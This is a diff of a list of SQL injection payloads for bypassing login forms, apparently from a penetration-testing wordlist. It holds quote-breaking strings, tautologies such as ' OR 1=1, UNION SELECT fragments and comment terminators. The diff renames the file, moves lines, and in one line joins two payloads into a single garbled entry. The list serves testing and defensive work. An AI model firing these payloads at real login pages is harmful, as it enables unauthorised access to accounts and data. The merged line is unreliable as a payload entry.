@@ -1,6 +1,4 @@
-# LOGIN-SQLI-PAYLOADS
-
-
+# Login SQLI Payloads
 
 '
 ''
@@ -19,17 +17,16 @@
 ' OR '1
 ' OR 1 -- -
 " OR "" = "
-" OR 1 = 1 -- -
+" OR 1 = 1 -- -ZAP' OR '1'='1'--
 ' OR '' = '
 '='
-
 'LIKE'
 '=0--+
  OR 1=1
+
 ' OR 'x'='x
 ' AND id IS NULL; --
 '''''''''''''UNION SELECT '2
-ZAP' OR '1'='1'--
 %00
 /*…*/ 
 +		addition, concatenate (or space in url)
